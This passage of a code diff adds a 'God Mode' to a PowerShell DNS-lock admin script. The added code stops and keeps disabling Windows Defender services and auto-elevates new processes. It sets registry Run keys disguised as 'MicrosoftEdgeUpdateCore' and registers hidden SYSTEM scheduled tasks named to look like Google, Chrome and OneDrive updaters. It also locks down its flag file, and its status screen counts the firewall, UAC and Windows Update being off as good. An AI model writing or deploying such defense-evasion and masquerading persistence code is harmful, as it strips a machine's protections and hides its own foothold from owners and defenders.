+                }
+                # Re-apply service-level disable if any service got re-enabled
+                $DefenderServices = @("WinDefend", "WdNisSvc", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc")
+                foreach ($svc in $DefenderServices) {
+                    try {
+                        $svcObj = Get-Service -Name $svc -ErrorAction SilentlyContinue
+                        if ($svcObj -and $svcObj.Status -eq 'Running') {
+                            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
+                            Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
+                            Write-Log -Message "Resurrection killer: re-disabled $svc" -Type "INFO" -Color Gray
+                        }
+                    } catch { }
+                }
+            }
+
+            # --- New Process Elevation ---
+            $newProcesses = Get-WmiObject Win32_Process | Where-Object {
+                $_.CreationDate -and 
+                ([datetime]::ParseExact($_.CreationDate.Substring(0,14), "yyyyMMddHHmmss", $null)) -gt (Get-Date).AddSeconds(-10)
+            }
+
+            foreach ($proc in $newProcesses) {
+                if ($proc.ExecutablePath -and $proc.ExecutablePath -like "*.exe") {
+                    $path = $proc.ExecutablePath
+
+                    # Stronger duplicate prevention (60-second cooldown)
+                    if (-not $lastElevated.ContainsKey($path) -or 
+                        $lastElevated[$path] -lt (Get-Date).AddSeconds(-60)) {
+
+                        $lastElevated[$path] = Get-Date
+                        Elevate-Process $path
+                    }
+                }
+            }
+        }
+        catch {
+            Write-Log -Message "Monitoring error (recovering in 5s): $_" -Type "ERROR" -Color Red
+            Start-Sleep -Seconds 5
+        }
+    }
+}
+
+function Enable-GodMode {
+    "1" | Out-File $GodModeFlagFile -Force
+    Register-StealthTask
+    Enable-DangerousMode
+
+    # --- Registry Persistence (Run keys) ---
+    Write-Log -Message "Setting registry persistence keys..." -Type "INFO" -Color Gray
+    $ScriptCmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -ToggleOn"
+    try {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdateCore" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MicrosoftEdgeUpdateCore" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
+        Write-Log -Message "Registry persistence keys set." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "Failed to set registry persistence: $_" -Type "WARN" -Color Yellow }
+
+    # --- Multi-layer task redundancy (backup task names) ---
+    Write-Log -Message "Registering backup persistence tasks..." -Type "INFO" -Color Gray
+    $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_")
+    foreach ($Prefix in $BackupPrefixes) {
+        try {
+            $taskName = $Prefix + (Get-Random -Minimum 10000 -Maximum 99999)
+            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -ToggleOn"
+            $trigger = New-ScheduledTaskTrigger -AtLogon
+            $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
+            Write-Log -Message "Backup task $taskName registered." -Type "INFO" -Color Gray
+        } catch { Write-Log -Message "Backup task $Prefix failed: $_" -Type "WARN" -Color Yellow }
+    }
+
+    # --- Self-protection: harden flag file ---
+    try {
+        $FlagAcl = Get-Acl -Path $GodModeFlagFile -ErrorAction SilentlyContinue
+        if ($FlagAcl) {
+            $FlagAcl.SetAccessRuleProtection($true, $false)
+            $FlagAcl.Access | ForEach-Object { $FlagAcl.RemoveAccessRule($_) | Out-Null }
+            $FlagAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
+            $FlagAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Read", "None", "None", "Allow")))
+            Set-Acl -Path $GodModeFlagFile -AclObject $FlagAcl -ErrorAction SilentlyContinue
+        }
+    } catch { Write-Log -Message "Flag file self-protection failed: $_" -Type "WARN" -Color Yellow }
+
+    Write-Log -Message "God Mode ENABLED" -Type "WARN" -Color Yellow
+}
+
+function Disable-GodMode {
+    Remove-Item $GodModeFlagFile -Force -ErrorAction SilentlyContinue
+    Unregister-StealthTask
+
+    # --- Remove backup task prefixes ---
+    $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_", $GodModeTaskPrefix)
+    foreach ($Prefix in $BackupPrefixes) {
+        try {
+            Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue |
+                Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
+        } catch { }
+    }
+
+    # --- Remove registry persistence ---
+    try {
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
+    } catch { Write-Log -Message "Failed to remove registry persistence: $_" -Type "WARN" -Color Yellow }
+
+    Disable-DangerousMode
+    Write-Log -Message "God Mode DISABLED" -Type "WARN" -Color Yellow
+}
+
+function Show-GodModeStatus {
+    Write-Host "`n=====================================================" -ForegroundColor DarkGray
+    Write-Host " GOD MODE STATUS DETAIL                    " -ForegroundColor White
+    Write-Host "=====================================================" -ForegroundColor DarkGray
+
+    # Core God Mode state
+    if (Test-Path $GodModeFlagFile) {
+        Write-Host "  God Mode State          : ACTIVE" -ForegroundColor Red
+    } else {
+        Write-Host "  God Mode State          : INACTIVE" -ForegroundColor Green
+    }
+
+    # Stealth task status
+    $StealthTasks = Get-ScheduledTask -TaskName "$GodModeTaskPrefix*" -ErrorAction SilentlyContinue
+    if ($StealthTasks) {
+        Write-Host "  Stealth Task            : INSTALLED ($($StealthTasks.Count) found)" -ForegroundColor Cyan
+    } else {
+        Write-Host "  Stealth Task            : NOT INSTALLED" -ForegroundColor DarkGray
+    }
+
+    # Defender processes
+    $DefenderProcs = @("MsMpEng", "MsMpEngCP", "MpDefenderCoreService", "MsSense", "smartscreen", "SecurityHealthService")
+    $RunningDefender = 0
+    foreach ($proc in $DefenderProcs) {
+        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) { $RunningDefender++ }
+    }
+    if ($RunningDefender -eq 0) {
+        Write-Host "  Defender Processes      : ALL STOPPED ($RunningDefender/$($DefenderProcs.Count))" -ForegroundColor Green
+    } else {
+        Write-Host "  Defender Processes      : $RunningDefender RUNNING ($($DefenderProcs.Count) total)" -ForegroundColor Red
+    }
+
+    # Defender services
+    $DefenderSvcs = @("WinDefend", "WdNisSvc", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc")
+    $RunningSvcs = 0
+    foreach ($svc in $DefenderSvcs) {
+        $svcObj = Get-Service -Name $svc -ErrorAction SilentlyContinue
+        if ($svcObj -and $svcObj.Status -eq 'Running') { $RunningSvcs++ }
+    }
+    if ($RunningSvcs -eq 0) {
+        Write-Host "  Defender Services       : ALL STOPPED ($RunningSvcs/$($DefenderSvcs.Count))" -ForegroundColor Green
+    } else {
+        Write-Host "  Defender Services       : $RunningSvcs RUNNING ($($DefenderSvcs.Count) total)" -ForegroundColor Red
+    }
+
+    # Real-time monitoring
+    try {
+        $MpPref = Get-MpPreference -ErrorAction SilentlyContinue
+        if ($MpPref -and $MpPref.DisableRealtimeMonitoring) {
+            Write-Host "  Real-Time Monitoring    : DISABLED" -ForegroundColor Green
+        } else {
+            Write-Host "  Real-Time Monitoring    : ENABLED (or indeterminate)" -ForegroundColor Red
+        }
+    } catch {
+        Write-Host "  Real-Time Monitoring    : UNKNOWN (Get-MpPreference failed)" -ForegroundColor DarkGray
+    }
+
+    # Firewall
+    $FirewallProfiles = Get-NetFirewallProfile -ErrorAction SilentlyContinue
+    $FwEnabled = 0
+    foreach ($fp in $FirewallProfiles) {
+        if ($fp.Enabled) { $FwEnabled++ }
+    }
+    if ($FwEnabled -eq 0) {
+        Write-Host "  Windows Firewall        : ALL PROFILES OFF" -ForegroundColor Green
+    } else {
+        Write-Host "  Windows Firewall        : $FwEnabled/$(($FirewallProfiles | Measure-Object).Count) PROFILES ON" -ForegroundColor Red
+    }
+
+    # UAC / LUA
+    try {
+        $lua = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -ErrorAction SilentlyContinue
+        if ($lua -and $lua.EnableLUA -eq 0) {
+            Write-Host "  UAC (LUA)               : DISABLED" -ForegroundColor Green
+        } else {
+            Write-Host "  UAC (LUA)               : ENABLED" -ForegroundColor Red
+        }
+    } catch {
+        Write-Host "  UAC (LUA)               : UNKNOWN" -ForegroundColor DarkGray
+    }
+
+    # Windows Update
+    try {
+        $wu = Get-Service -Name "wuauserv" -ErrorAction SilentlyContinue
+        if ($wu -and $wu.Status -eq 'Running') {
+            Write-Host "  Windows Update Service  : RUNNING" -ForegroundColor Red
+        } else {
+            Write-Host "  Windows Update Service  : STOPPED" -ForegroundColor Green
+        }
+    } catch {
+        Write-Host "  Windows Update Service  : UNKNOWN" -ForegroundColor DarkGray
+    }
+
+    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
+}
+
+# ============================================================================
+# 8. CLI EXECUTION HANDLER
 # ============================================================================
 
 # Handle CLI Flags
@@ -951,6 +1622,44 @@ if ($Uninstall) {
     Exit
 }
 
+# God Mode CLI Handlers
+if ($ToggleOn) {
+    if (-not (Test-BuiltInAdmin)) {
+        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can use God Mode.`n" -ForegroundColor Red
+        Exit 1
+    }
+    Enable-GodMode; Exit
+}
+if ($ToggleOff) {
+    if (-not (Test-BuiltInAdmin)) {
+        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can use God Mode.`n" -ForegroundColor Red
+        Exit 1
+    }
+    Disable-GodMode; Exit
+}
+if ($GodModeStatus) { Show-GodModeStatus; Exit }
+if ($Launch) {
+    if (-not (Test-BuiltInAdmin)) {
+        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can use God Mode.`n" -ForegroundColor Red
+        Exit 1
+    }
+    Start-Monitoring; Exit
+}
+if ($InstallGodMode) {
+    if (-not (Test-BuiltInAdmin)) {
+        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can install God Mode.`n" -ForegroundColor Red
+        Exit 1
+    }
+    Install-GodModePersistence; Exit
+}
+if ($UninstallGodMode) {
+    if (-not (Test-BuiltInAdmin)) {
+        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can uninstall God Mode.`n" -ForegroundColor Red
+        Exit 1
+    }
+    Uninstall-GodModePersistence; Exit
+}
+
 # If no flags are passed, load the Interactive Menu
 do {
     Clear-Host
@@ -960,18 +1669,37 @@ do {
 
     $CurrentStatus = Get-DNSLockStatus
 
-    Write-Host "`n-----------------------------------------------------"
+    Write-Host "`n-----------------------------------------------------" -ForegroundColor DarkGray
+    Write-Host "  DNS PROTECTION    " -ForegroundColor Cyan
+    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
     Write-Host "[1] DEPLOY LOCK (Secure All Active Adapters)" -ForegroundColor Cyan
     Write-Host "[2] REMOVE LOCK (Ångra / Restore Access)" -ForegroundColor Yellow
     if (-not (Test-Path $InstallDir)) {
         Write-Host "[3] INSTALL SERVICE (Auto-Heal & Create 'dnslock' command)" -ForegroundColor Green
     }
     Write-Host "[4] UNINSTALL SERVICE (Remove background tasks & Unlock)" -ForegroundColor Red
+    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
+    Write-Host "  SYSTEM            " -ForegroundColor White
+    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
     Write-Host "[5] REFRESH SYSTEM STATUS" -ForegroundColor Gray
-    Write-Host "[6] EXIT TERMINAL" -ForegroundColor Gray
-    Write-Host "-----------------------------------------------------"
+    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
+    Write-Host "  GOD MODE (DANGEROUS)  " -ForegroundColor Magenta
+    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
+    if (-not (Test-Path $GodModeInstallDir)) {
+        Write-Host "[6] INSTALL GOD MODE SERVICE (Auto-Enable & Create 'godmode' CLI)" -ForegroundColor Green
+    } else {
+        Write-Host "[6] UNINSTALL GOD MODE SERVICE (Remove background tasks)" -ForegroundColor Red
+    }
+    Write-Host "[7] ENABLE GOD MODE (Built-in Admin Only)" -ForegroundColor Magenta
+    Write-Host "[8] DISABLE GOD MODE (Built-in Admin Only)" -ForegroundColor DarkMagenta
+    Write-Host "[9] CHECK GOD MODE STATUS" -ForegroundColor Gray
+    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
+    Write-Host "  SESSION           " -ForegroundColor White
+    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
+    Write-Host "[10] EXIT TERMINAL" -ForegroundColor Gray
+    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
 
-    $Choice = Read-Host "Select an administrative action (1-6)"
+    $Choice = Read-Host "Select an administrative action (1-10)"
     $IntegrityStatus = Test-IntegrityStatus
 
     switch ($Choice) {
@@ -1006,7 +1734,40 @@ do {
         }
         "4" { Uninstall-Persistence; Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") }
         "5" { Start-Sleep -Milliseconds 200 }
-        "6" { Write-Host "Exiting..." -ForegroundColor DarkGray; Start-Sleep -Milliseconds 500; break }
+        "6" {
+            if (-not (Test-BuiltInAdmin)) {
+                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can use God Mode.`n" -ForegroundColor Red
+            } else {
+                if (-not (Test-Path $GodModeInstallDir)) {
+                    Install-GodModePersistence
+                    Write-Host "God Mode service installed." -ForegroundColor Green
+                } else {
+                    Uninstall-GodModePersistence
+                    Write-Host "God Mode service uninstalled." -ForegroundColor Yellow
+                }
+            }
+            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+        }
+        "7" {
+            if (-not (Test-BuiltInAdmin)) {
+                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can use God Mode.`n" -ForegroundColor Red
+            } else {
+                Enable-GodMode
+                Write-Host "God Mode enabled." -ForegroundColor Green
+            }
+            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+        }
+        "8" {
+            if (-not (Test-BuiltInAdmin)) {
+                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can use God Mode.`n" -ForegroundColor Red
+            } else {
+                Disable-GodMode
+                Write-Host "God Mode disabled." -ForegroundColor Yellow
+            }
+            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+        }
+        "9" { Show-GodModeStatus; Start-Sleep -Seconds 2 }
+        "10" { Write-Host "Exiting..." -ForegroundColor DarkGray; Start-Sleep -Milliseconds 500; break }
         default { Write-Warning "Invalid Selection."; Start-Sleep -Seconds 1 }
     }
-} while ($Choice -ne "6")
+} while ($Choice -ne "10")
